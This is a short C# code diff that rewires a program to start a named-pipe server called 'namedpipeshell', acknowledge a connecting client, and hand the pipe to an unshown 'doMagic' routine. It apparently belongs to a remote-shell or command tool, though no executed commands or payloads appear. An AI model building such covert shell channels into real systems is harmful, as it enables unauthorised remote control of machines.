@@ -336,23 +336,21 @@ namespace myclient
         }
 
 
-            public void StartPipServer()
+        public void StartPipServer()
         {
-
-            //init
-            PsRun myPsRun = new PsRun();
-            myPsRun.init();
-
-
-            string command_tag;
-            string command;
-
+            
             try
             {
                 var pipe = new NamedPipeServerStream("namedpipeshell", PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message);
                 Console.WriteLine("[*] Waiting for client connection...");
                 pipe.WaitForConnection();
                 Console.WriteLine("[*] Client connected.");
+                
+                //ack connecition
+                byte[] msg = Encoding.ASCII.GetBytes("PIPE_CONNECTED");
+                pipe.Write(msg, 0, msg.Length);
+
+                doMagic(pipe);
 
             }//end of try
             catch (Exception e)
@@ -453,7 +451,9 @@ namespace myclient
             MyApp t_app = new MyApp();
             //t_app.StartClient();
             //t_app.StartServer();
-            t_app.StartPipeClinet();
+            t_app.StartPipServer();
+            //t_app.StartPipeClinet();
+
         }
     }
 }
